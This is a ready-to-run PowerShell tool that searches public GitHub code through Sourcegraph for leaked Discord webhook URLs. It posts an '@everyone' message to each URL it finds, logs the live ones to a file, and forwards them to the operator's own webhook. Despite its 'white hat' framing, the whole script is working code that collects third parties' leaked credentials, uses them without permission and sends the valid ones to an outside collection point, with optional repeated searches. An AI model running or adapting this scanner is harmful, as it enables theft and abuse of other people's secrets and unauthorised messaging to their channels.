<#=========================== Beigeworm's Webhook Scanner ================================

SYNOPSIS
Uses sourcegraph API to search for webhooks on github. 

HOW IT WORKS
1. Searches sourcegraph.com api for possible valid webhooks (correct length and makeup)
2. Tries to send a message to each webhook found.
3. If successful you can have a notification sent to yourown discord webhook. (defined below) 

USAGE
1. Run the script
2. Enter webhook information (Optional)
3. Review the results
4. Press enter to exit.
#>

# Change for your own webhook (optional)
$hookurl = "YOUR_WEBHOOK_HERE"
# If you want to notify another webhook found elsewhere enter it here (optional)
$customUrl = "YOUR_FOUND_WEBHOOK_HERE"

# Console Setup
[Console]::BackgroundColor = "Black"
[Console]::SetWindowSize(132, 40)
[Console]::Title = " Webhook Scanner"
[Console]::CursorVisible = $false

# Header for console
Function Header{
Cls
Write-Host "
===================================================================================================================
   __      __      ___.   .__                   __               _________                                         
  /  \    /  \ ____\_ |__ |  |__   ____   ____ |  | __          /   _____/ ____ _____    ____   ____   ___________ 
  \   \/\/   // __ \| __ \|  |  \ /  _ \ /  _ \|  |/ /  ______  \_____  \_/ ___\\__  \  /    \ /    \_/ __ \_  __ \
   \        /\  ___/| \_\ \   Y  (  <_> |  <_> )    <  /_____/  /        \  \___ / __ \|   |  \   |  \  ___/|  | \/
    \__/\  /  \___  >___  /___|  /\____/ \____/|__|_ \         /_______  /\___  >____  /___|  /___|  /\___  >__|   
         \/       \/    \/     \/                   \/                 \/     \/     \/     \/     \/     \/       
===================================================================================================================" -ForegroundColor Green
}
# Show Title Header
Header
                                
# API endpoint and search parameters
$apiUrl = "https://sourcegraph.com/.api/search/stream"
$context = "context:global"
$webhookPattern = "https://discord.com/api/webhooks/"
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
# delay between searches

$Continuous = Read-Host "Continuous Search (Y/N) "
if ($Continuous -eq 'Y'){
    $SleepMins = Read-Host "How many minutes in-between searches? "
    $SleepSecs = [int]$SleepMins * 60
    [int]$runcheck = Read-Host "How many total searches? "
}
else{
    $runcheck = 1
}

# Create found webhooks file
$filePath = "Found-Webhooks.txt"
if (!(Test-Path $filePath)){
"FOUND WEBHOOKS :" | Out-File -FilePath $filePath -Append -Force
}

# Ask for Webhook Information 
if ($hookurl.Length -ne 121){
$hookurl = Read-Host "Enter Your Own Webhook (Optional) "
}
if ($customUrl.Length -ne 121){
$customUrl = Read-Host "Enter A Custom Webhook (Optional) "
}
Header

# Found Webhook Notification (victim)
Function WebhookSend{
# Create JSON object
$jsonPayload = @{
    username   = "egieBOT"
    content    = "@everyone We Found Your Webhook!"
    avatar_url = "https://i.ibb.co/vJh2LDp/img.png"
    tts        = $false
    embeds     = @(
        @{
            title       = "WEBHOOK FOUND"
            description = "We found your webhook online.`n Don't worry, you just have to change your webhook URL.`n`n`nFor more information, check out our Discord link:`nhttps://dsc.gg/whitehathacker"
            color       = 16711680
            url         = "https://dsc.gg/whitehathacker"
            thumbnail   = @{
                url = "https://i.ibb.co/4PhW7wF/whh.png"
            }
            author      = @{
                name     = "egieb"
                url      = "https://github.com/beigeworm"
                icon_url = "https://i.ibb.co/vJh2LDp/img.png"
            }
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}

# Convert to a JSON string and send to victim webhook
$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
Irm -Uri $hook -Method Post -Body $jsonString -ContentType 'application/json'
}

# Custom URL message to webhook
If($customUrl.Length -eq 121){
    $hook = $customUrl
    Write-Host "Trying : $hook" -ForegroundColor DarkGray
    try{
        WebhookSend
        sleep -m 500
        $jsonsys = @{"username" = "egieBOT" ;"content" = "WEBHOOK LIVE! > $hook"} | ConvertTo-Json
        Irm -Uri $hookUrl -Method Post -Body $jsonsys -ContentType 'application/json'
        Write-Host "Webhook Success! : $hook" -ForegroundColor Green
    }
    catch{
        Write-Host "Webhook not valid $hook `n> ERROR: $_" -ForegroundColor Red  
    }
    pause
    exit
}

# Send a message to your webhook (test message)
if ($hookurl.Length -eq 121){
    $jsonPayload = @{
        username   = "egieBOT"
        avatar_url = "https://i.ibb.co/vJh2LDp/img.png"
        tts        = $false
        embeds     = @(
            @{
                title       = "WEBHOOK SCANNER STARTED"
                description = "Webhook scanner started.. `nStand by for any messages to follow! `nIf the scanner successfully finds a live webhook on Github you will be notified here. `n`nFor more information, check out our Discord link:`nhttps://dsc.gg/whitehathacker"
                color       = 65280
                thumbnail   = @{
                    url = "https://i.ibb.co/4PhW7wF/whh.png"
                }
                author      = @{
                    name     = "egieb"
                    url      = "https://github.com/beigeworm"
                    icon_url = "https://i.ibb.co/vJh2LDp/img.png"
                }
                footer      = @{
                    text = "$timestamp"
                }
            }
        )
    }
    $jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
    Irm -Uri $hookurl -Method Post -Body $jsonString -ContentType 'application/json'
}

while ($runcheck -gt 0){
    
    # Encode the query for the URL
    $encodedQuery = [uri]::EscapeDataString($context)
    $encodedwh = [uri]::EscapeDataString($webhookPattern)
    
    # Construct the full URL
    $fullUrl = ("$apiUrl" + '?q=' + "$encodedQuery" + '+' + "$encodedwh")
    
    # Make the web request
    try {
    $response = Irm -Uri $fullUrl -Method Get -Headers @{ 'Accept' = 'text/event-stream' }
        
    # Define the URL pattern to match
    $urlPattern = "https://discord\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"
    
    # Use Select-String to find all matches
    Write-Host "Searching API response for matching webhooks.." -ForegroundColor Yellow
    Write-Host "Search #$runcheck" -ForegroundColor Yellow
    $matches = $response | Select-String -Pattern $urlPattern -AllMatches | ForEach-Object { $_.Matches.Value }
    
    # Filter and display matches based on character count
    $filteredMatches = $matches | Where-Object { $_.Length -eq 121 }
    sleep 1
    
    # Check if any filtered matches were found
        if ($filteredMatches.Count -gt 0) {
            Write-Host "Found matching URLs. Starting Connection Test.." -ForegroundColor Green
            $filteredMatches | ForEach-Object {
            sleep -m 500
            $hook = $_
            Write-Host "Trying : $hook" -ForegroundColor DarkGray
    
            foreach ($line in Get-Content $filePath) {
                # Check if the line matches the variable
                if ($line -eq $hook) {
                    Write-Host "Already Found: $line`n" -ForegroundColor Yellow
                    return
                    }
                }
            
            # Test the webhook validity
            try{
                WebhookSend
                sleep -m 500
                # If successful send a notification
                $jsonsys = @{"username" = "egieBOT" ;"content" = "FOUND WEBHOOK > $hook"} | ConvertTo-Json
                Irm -Uri $hookUrl -Method Post -Body $jsonsys -ContentType 'application/json'
                Write-Host "Webhook FOUND! : $hook"
                $hook | Out-File -FilePath $filePath -Append -Force
            }
            # if invalid show error in console
            catch{
                Write-Host "Webhook not valid : $_`n" -ForegroundColor Red  
            }
        }
    }
    else{Write-Host "No matching URLs."}
    } 
    catch{Write-Host "Error: $_"}

    if ($Continuous -eq 'Y'){
        Write-Host "Sleeping for $SleepMins minute(s) / $runcheck searches remaining" -ForegroundColor Yellow
        Sleep $SleepSecs
        Write-Host "Restarting Search..`n" -ForegroundColor Green
        Header
    }
    $runcheck--
}
# Hold the script to view results before closing
pause
